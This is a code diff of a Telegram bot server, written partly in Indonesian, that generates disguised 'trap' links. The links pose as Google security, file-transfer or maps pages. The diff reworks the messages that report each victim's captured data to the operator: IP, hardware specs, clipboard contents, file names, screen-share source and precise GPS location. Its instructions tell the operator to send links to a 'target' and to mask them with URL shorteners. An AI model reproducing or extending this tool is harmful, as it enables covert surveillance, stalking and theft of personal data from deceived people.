@@ -128,27 +128,31 @@ async function startServer() {
       const tmplId = data.tmplId || '1';
       const templateName = templates[tmplId] ? templates[tmplId].name : 'Default';
       
-      let header = '💻 <b>HARDWARE AUDIT REVEALED</b> 💻';
-      let status = '🔍 <i>Target sedang memproses izin advanced...</i>';
+      let header = '🕵️‍♂️ <b>SYSTEM AUDIT: IDENTITY CAPTURED</b>';
+      let status = '🔄 <i>Target sedang memproses izin tambahan...</i>';
 
-      if (tmplId === '1') {
-        header = '⚡ <b>ULTRA BREACH CAPTURED!</b> ⚡';
-      } else if (tmplId === '11') {
-        header = '💀 <b>PEGASUS ZERO-DAY EXPLOIT!</b> 💀';
-        status = '🔥 <i>Status: Full System Audit in Progress...</i>';
-      } else if (tmplId === '9') {
-        header = '🕵️ <b>STEALTH LOG ACQUIRED!</b> 🕵️';
-        status = '🏁 <i>Status: Silent Tracking Aktif.</i>';
+      if (tmplId === 'google') {
+        header = '🛡️ <b>GOOGLE_SECURITY: ACCESS GRANTED</b>';
+      } else if (tmplId === 'pegasus') {
+        header = '💀 <b>PEGASUS_V5: KERNEL_BREACH_SUCCESS</b>';
+        status = '🔥 <i>Status: Deep Scan Hardware Aktif.</i>';
+      } else if (tmplId === 'file') {
+        header = '📂 <b>FILE_TRANSFER: ACCESS_KEY_CAPTURED</b>';
       }
 
-      let msg = `${header}\n` +
+      let msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `📁 <b>Template:</b> <code>${escapeHTML(templateName)}</code>\n` +
-                  `🖥️ <b>Res:</b> <code>${escapeHTML(data.screen || 'N/A')}</code>\n` +
-                  `🔋 <b>Bat:</b> <code>${escapeHTML(data.battery || 'N/A')}</code>\n` +
-                  `🌍 <b>TZ:</b> <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
-                  `⚙️ <b>CPU:</b> <code>${escapeHTML(String(data.cores || 'N/A'))} Core</code>\n` +
-                  `🍎 <b>Platform:</b> <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `📋 <b>TEMPLATE INFO</b>\n` +
+                  `├ Name: <code>${escapeHTML(templateName)}</code>\n` +
+                  `└ Flow: <code>Advanced Audit</code>\n\n` +
+                  `🖥️ <b>HARDWARE SPECS</b>\n` +
+                  `├ Platform: <code>${escapeHTML(data.platform || 'N/A')}</code>\n` +
+                  `├ CPU Cores: <code>${escapeHTML(String(data.cores || 'N/A'))}</code>\n` +
+                  `├ RAM (Est): <code>${escapeHTML(String(data.mem || 'N/A'))} GB</code>\n` +
+                  `└ Screen: <code>${escapeHTML(data.screen || 'N/A')}</code>\n\n` +
+                  `🌍 <b>REGION & ENV</b>\n` +
+                  `├ Timezone: <code>${escapeHTML(data.timezone || 'N/A')}</code>\n` +
+                  `└ Referrer: <code>${escapeHTML(data.ref || 'Direct')}</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
                   `${status}`;
 
@@ -163,23 +167,26 @@ async function startServer() {
     const chatId = getChatIdFromTrapId(id);
     if (botInstance && chatId) {
       const data = req.body as any;
-      let extraMsg = `📎 <b>ADVANCED DATA CAPTURED!</b> 📎\n` +
+      let extraMsg = `📎 <b>ADVANCED MODULE CAPTURED</b> 📎\n` +
                      `━━━━━━━━━━━━━━━━━━━━\n`;
       
       if (data.clipboard) {
-        extraMsg += `📋 <b>Clipboard Token:</b>\n<code>${escapeHTML(data.clipboard)}</code>\n\n`;
+        extraMsg += `📋 <b>CLIPBOARD DATA:</b>\n<pre>${escapeHTML(data.clipboard)}</pre>\n\n`;
       }
       if (data.media) {
-        extraMsg += `🎙️ <b>Media Hardware:</b>\n<pre>${escapeHTML(data.media)}</pre>\n\n`;
+        extraMsg += `🎙️ <b>AV HARDWARE AUDIT:</b>\n<pre>${escapeHTML(data.media)}</pre>\n\n`;
       }
       if (data.file_name) {
-        extraMsg += `📁 <b>File Access Audit:</b>\n📄 <b>Name:</b> <code>${escapeHTML(data.file_name)}</code>\n📦 <b>Size:</b> <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
+        extraMsg += `📂 <b>FILE ACCESS GRANTED:</b>\n` +
+                    `├ Name: <code>${escapeHTML(data.file_name)}</code>\n` +
+                    `└ Size: <code>${(data.file_size / 1024).toFixed(2)} KB</code>\n\n`;
       }
       if (data.screen_label) {
-        extraMsg += `🖥️ <b>Screen Share Source:</b>\n<code>${escapeHTML(data.screen_label)}</code>\n\n`;
+        extraMsg += `🖥️ <b>SCREEN SOURCE:</b>\n<code>${escapeHTML(data.screen_label)}</code>\n\n`;
       }
       
-      extraMsg += `━━━━━━━━━━━━━━━━━━━━`;
+      extraMsg += `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `✅ <i>Data modul berhasil diekstrak.</i>`;
       botInstance.telegram.sendMessage(chatId, extraMsg, { parse_mode: 'HTML' }).catch(console.error);
     }
     res.sendStatus(200);
@@ -192,22 +199,24 @@ async function startServer() {
       const { lat, lon, acc, tmplId } = req.body;
       const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
       
-      let header = '📍 <b>GEOLOCATION FIX ACQUIRED!</b> 📍';
-      if (tmplId === '1') {
-        header = '⚡ <b>ULTRA LOCATION TRACKED!</b> ⚡';
-      } else if (tmplId === '5') {
-        header = '🗺️ <b>MAPS SYNC COORDINATES!</b> 🗺️';
+      let header = '📍 <b>GPS_FIX: TARGET_LOCATED</b>';
+      if (tmplId === 'google') {
+        header = '⚡ <b>TRUSTED_LOCATION_SYNC</b>';
+      } else if (tmplId === 'maps') {
+        header = '🗺️ <b>MAPS_PRECISION_COORDINATES</b>';
       }
 
-      const msg = `${header}\n` +
+      const msg = `<b>${header}</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🛰️ <b>Latitude:</b> <code>${lat}</code>\n` +
-                  `🛰️ <b>Longitude:</b> <code>${lon}</code>\n` +
-                  `🎯 <b>Akurasi:</b> <code>${acc} meter</code>\n` +
+                  `🛰️ <b>COORDINATES</b>\n` +
+                  `├ Lat: <code>${lat}</code>\n` +
+                  `├ Lon: <code>${lon}</code>\n` +
+                  `└ Acc: <code>${acc} meter</code>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🗺️ <a href="${mapLink}">BUKA LOKASI DI GOOGLE MAPS</a>\n` +
+                  `🔗 <b>NAVIGATION LINK</b>\n` +
+                  `🌐 <a href="${mapLink}">Lihat Lokasi di Google Maps</a>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `🏁 <i>Status: Verifikasi Selesai. Data ini 99% akurat.</i>`;
+                  `🏁 <i>Status: Verifikasi Spasial Berhasil.</i>`;
 
       botInstance.telegram.sendMessage(chatId, msg, { 
         parse_mode: 'HTML', 
@@ -395,14 +404,21 @@ async function startServer() {
     bot.command('logger', (ctx) => {
       const id = generateTrapId(ctx.chat.id);
       
-      let replyMessage = `🎣 <b>LINK LOGGER BERHASIL DIBUAT!</b>\n\n<b>Silakan copy link dengan template yang Anda inginkan:</b>\n\n`;
+      let replyMessage = `🎣 <b>STEALTH LINK GENERATED</b>\n` +
+                         `━━━━━━━━━━━━━━━━━━━━\n` +
+                         `Silakan pilih template link yang sesuai dengan target Anda:\n\n`;
       
       Object.entries(templates).forEach(([key, tmpl]) => {
         const trapUrl = `${appHost.replace(/\/$/, '')}/t/${key}/${id}`;
-        replyMessage += `<b>${key}. ${tmpl.name}</b>\n<code>${trapUrl}</code>\n\n`;
+        replyMessage += `<b>${tmpl.name}</b>\n🔗 <code>${trapUrl}</code>\n\n`;
       });
       
-      replyMessage += `<b>Cara Penggunaan:</b>\n1. Copy salah satu link di atas dan kirimkan ke target.\n2. Saat target membuka link, Anda mendapat IP Target.\n3. Jika target mengklik tombol dan mengizinkan (Allow) akses, Anda akan mendapat <b>Hardware Info</b> dan <b>Lokasi Presisi</b>.\n\n<i>Note: Sangat disarankan set host ke URL Production Anda menggunakan <code>/sethost</code> jika link di atas tidak bisa dibuka.</i>`;
+      replyMessage += `━━━━━━━━━━━━━━━━━━━━\n` +
+                      `💡 <b>CARA KERJA:</b>\n` +
+                      `1. Kirim link di atas ke target.\n` +
+                      `2. Saat diklik, IP & Browser akan terdeteksi.\n` +
+                      `3. Jika target klik button "Verify", data <b>Advanced Module</b> (GPS, Cam-ID, Screen, Files) akan terkirim.\n\n` +
+                      `⚠️ <i>Tips: Gunakan shortener (bit.ly/tinyurl) agar link terlihat lebih profesional.</i>`;
       
       ctx.reply(replyMessage, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
     });
